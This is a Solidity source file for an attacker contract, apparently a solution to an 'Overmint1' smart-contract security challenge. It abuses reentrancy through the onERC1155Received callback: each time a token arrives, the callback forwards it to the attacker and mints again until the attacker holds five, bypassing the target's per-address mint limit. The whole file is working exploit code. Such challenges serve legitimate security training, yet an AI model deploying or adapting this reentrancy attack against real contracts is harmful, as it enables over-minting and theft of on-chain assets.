// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

// import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IERC1155Mintable{

    function balanceOf(address account, uint256 id) external view returns (uint256);

    // ----------- State changing Api -----------

    function mint(uint256 id, bytes calldata data) external;

    function setApprovalForAll(address operator, bool approved) external;

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes memory data) external;

}

contract Overmint1_ERC1155Attacker  {

// contract Overmint1_ERC1155Attacker is IERC1155Receiver {

    IERC1155Mintable erc1155;
    address attacker;
    uint256 id;

    constructor(
        address _erc1155,
        uint256 _id
        ) {
        erc1155 = IERC1155Mintable(_erc1155);
        id = _id;
    }

    function attack() external {
        attacker = msg.sender;
        erc1155.mint(id, new bytes(0));
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {

        if(erc1155.balanceOf(attacker,id ) < 5) {

            erc1155.safeTransferFrom(address(this), attacker, id, 1, new bytes(0));
            erc1155.mint(id, new bytes(0));

            if (erc1155.balanceOf(attacker, id) == 5) return this.onERC1155Received.selector;

        }
        return this.onERC1155Received.selector;

    }

    // function onERC1155BatchReceived(
    //     address operator,
    //     address from,
    //     uint256[] calldata ids,
    //     uint256[] calldata values,
    //     bytes calldata data
    // ) external override returns (bytes4){

    // }

}
